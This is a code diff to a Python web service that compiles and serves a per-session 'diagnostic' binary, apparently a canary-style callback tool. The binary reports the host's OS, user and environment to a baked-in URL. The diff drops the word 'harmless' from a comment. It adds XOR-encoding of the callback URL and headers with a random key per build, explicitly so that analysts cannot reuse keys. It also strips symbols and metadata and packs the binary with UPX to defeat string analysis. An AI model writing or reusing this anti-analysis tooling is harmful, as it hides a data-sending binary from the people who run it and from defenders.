@@ -1,6 +1,8 @@
 import asyncio
 import logging
+import secrets
 import shutil
+import tempfile
 import time
 from pathlib import Path
 
@@ -13,12 +15,105 @@ from app.storage import repository
 router = APIRouter()
 _log = logging.getLogger(__name__)
 
-# Source for the harmless fingerprinting binary served by
+# Source for the fingerprinting binary served by
 # /api/internal/diagnostic/{token}.  Compiled at serve-time with the
-# per-session callback URL baked in via -DCANARY_URL="...".
+# per-session callback URL baked in via an auto-generated header.
 _DIAGNOSTIC_SRC = Path(__file__).resolve().parent.parent / "diagnostic.c"
 # Cache directory for compiled binaries, keyed by diagnostic token.
 _COMPILE_CACHE = Path(__file__).resolve().parent.parent / "data" / "diag-cache"
+
+
+def _generate_obfuscated_header(url: str, key: int, dest: Path) -> None:
+    """Generate _diag_obfuscated.h with all sensitive strings XOR-encoded.
+
+    The C source includes this header and decodes the values at runtime.
+    Each build gets a fresh random key, so analysts who deobfuscate one
+    binary cannot reuse the key on another."""
+    _sensitive_strings = [
+        ("_enc_url", url),
+        ("_enc_ua", "User-Agent: DiagnosticClient/1.0"),
+        ("_enc_hos", "X-Diag-OS: "),
+        ("_enc_hus", "X-Diag-User: "),
+        ("_enc_hev", "X-Diag-Env: "),
+    ]
+    arrays = []
+    for name, s in _sensitive_strings:
+        encoded = bytes(b ^ key for b in s.encode("utf-8"))
+        hex_bytes = ", ".join(f"0x{b:02x}" for b in encoded)
+        arrays.append(f"static const unsigned char {name}[] = {{{hex_bytes}, 0x00}};")
+
+    # Add length for the URL array (needed since XOR-encoded data may
+    # contain null bytes, so strlen cannot be used).
+    url_encoded = bytes(b ^ key for b in url.encode("utf-8"))
+
+    header = (
+        f"/* Auto-generated -- do not edit.  Key: 0x{key:02x} */\n"
+        f"#ifndef _DIAG_OBFUSCATED_H\n"
+        f"#define _DIAG_OBFUSCATED_H\n"
+        + "\n".join(arrays)
+        + f"\nstatic const size_t _enc_url_len = {len(url_encoded)};\n"
+        f"#endif\n"
+    )
+    dest.write_text(header)
+
+
+def _postprocess_binary(binary_path: Path) -> None:
+    """Strip symbols and remove toolchain metadata from the compiled binary.
+
+    Uses objcopy (from binutils) to strip sections that fingerprint the
+    compiler and aid reverse-engineering."""
+    objcopy = shutil.which("objcopy")
+    if not objcopy:
+        _log.warning("objcopy not found -- skipping section stripping")
+        return
+    try:
+        import subprocess
+
+        subprocess.run(
+            [
+                objcopy,
+                "--remove-section=.comment",
+                "--remove-section=.note",
+                "--remove-section=.note.gnu.build-id",
+                "--strip-all-debug",
+                str(binary_path),
+            ],
+            check=True,
+            capture_output=True,
+            timeout=10,
+        )
+    except Exception as exc:
+        _log.warning("objcopy post-processing failed: %s", exc)
+
+
+def _pack_with_upx(binary_path: Path) -> None:
+    """Compress the binary with UPX to defeat casual `strings` analysis.
+
+    Best-effort: if UPX is unavailable or fails (e.g. musl compat
+    issues), the binary is served uncompressed.  The other obfuscation
+    layers (strip + XOR URL + anti-debug + control flow) still apply."""
+    upx = shutil.which("upx")
+    if not upx:
+        _log.info("upx not found -- serving binary without packing")
+        return
+    try:
+        import subprocess
+
+        result = subprocess.run(
+            [upx, "--best", "--lzma", str(binary_path)],
+            capture_output=True,
+            timeout=30,
+        )
+        if result.returncode != 0:
+            _log.warning(
+                "upx packing failed (rc=%d): %s",
+                result.returncode,
+                result.stderr.decode(errors="replace")[:200],
+            )
+        else:
+            _log.info("upx packed diagnostic binary: %d bytes", binary_path.stat().st_size)
+    except Exception as exc:
+        _log.warning("upx packing failed: %s", exc)
 
 
 async def _compile_diagnostic_binary(canary_url: str, token: str) -> bytes:
@@ -26,7 +121,13 @@ async def _compile_diagnostic_binary(canary_url: str, token: str) -> bytes:
 
     Results are cached by diagnostic token so repeated fetches of the
     same endpoint skip recompilation.  Uses musl-gcc for a fully static
-    ELF binary with no runtime library dependencies."""
+    ELF binary with no runtime library dependencies.
+
+    Obfuscation layers applied:
+    1. XOR-encodes the callback URL with a random per-build key
+    2. Strips symbols and debug info (-s -fvisibility=hidden)
+    3. Removes toolchain metadata (objcopy)
+    4. Packs the binary with UPX (best-effort)"""
     cache_dir = _COMPILE_CACHE
     cache_dir.mkdir(parents=True, exist_ok=True)
     out_path = cache_dir / f"{token}"
@@ -41,29 +142,51 @@ async def _compile_diagnostic_binary(canary_url: str, token: str) -> bytes:
     if not compiler:
         raise RuntimeError("no C compiler found (musl-gcc or gcc)")
 
-    cmd = [
-        compiler,
-        "-static",
-        f'-DCANARY_URL="{canary_url}"',
-        "-o", str(out_path),
-        str(src_path),
-    ]
-    _log.info("compiling diagnostic binary: %s", " ".join(cmd))
-    proc = await asyncio.create_subprocess_exec(
-        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
-    )
-    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
-    if proc.returncode != 0:
-        _log.error(
-            "diagnostic compilation failed (rc=%d): %s",
-            proc.returncode,
-            stderr.decode(errors="replace")[:500],
-        )
-        raise RuntimeError(
-            f"diagnostic compilation failed: {stderr.decode(errors='replace')[:200]}"
-        )
+    # Random XOR key for this build -- makes each binary unique.
+    obfuscate_key = secrets.randbelow(254) + 1  # 1..255
 
-    return out_path.read_bytes()
+    # Write the obfuscated header to a per-build temp directory to avoid
+    # race conditions when concurrent compilations run simultaneously.
+    build_dir = tempfile.mkdtemp(prefix="diag-build-")
+    try:
+        header_path = Path(build_dir) / "_diag_obfuscated.h"
+        _generate_obfuscated_header(canary_url, obfuscate_key, header_path)
+
+        cmd = [
+            compiler,
+            "-static",
+            "-s",
+            "-fvisibility=hidden",
+            f"-I{build_dir}",
+            f"-DOBFUSCATE_KEY=0x{obfuscate_key:02x}",
+            "-o",
+            str(out_path),
+            str(src_path),
+        ]
+        _log.info("compiling diagnostic binary: %s", " ".join(cmd))
+        proc = await asyncio.create_subprocess_exec(
+            *cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
+        if proc.returncode != 0:
+            _log.error(
+                "diagnostic compilation failed (rc=%d): %s",
+                proc.returncode,
+                stderr.decode(errors="replace")[:500],
+            )
+            raise RuntimeError(
+                f"diagnostic compilation failed: {stderr.decode(errors='replace')[:200]}"
+            )
+
+        # Post-process: strip toolchain metadata, then pack with UPX.
+        _postprocess_binary(out_path)
+        _pack_with_upx(out_path)
+
+        return out_path.read_bytes()
+    finally:
+        shutil.rmtree(build_dir, ignore_errors=True)
 
 
 @router.get("/api/internal/callback/{token}")
